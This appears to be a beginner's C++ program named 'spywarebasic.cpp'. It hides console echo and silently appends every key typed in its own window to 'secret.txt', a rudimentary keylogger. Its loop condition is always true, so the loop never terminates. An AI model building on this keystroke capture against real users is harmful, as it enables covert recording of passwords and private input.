// spywarebasic.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

typedef struct IUnknown IUnknown;

#include <iostream>
#include <string>
#include <windows.h>
#include <conio.h>


using namespace std;

int main()
{
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(hStdin, &mode);
    SetConsoleMode(hStdin, mode & (~ENABLE_ECHO_INPUT));

    /*  
    char input[10000];
    scanf("%[^\t\n]", input);

    FILE* fp;
    fp = fopen("secret.txt", "w+");
    fprintf(fp, "%s",input);
    fclose(fp);
    */
    char c = NULL;
    while (c != 10 || c != '\t') {
        c = _getch();
        FILE* fp;
        fp = fopen("secret.txt", "a");
        fprintf(fp, "%c", c);
      //  printf("%d\n", c);
        fclose(fp);
    }

    return 0;
}
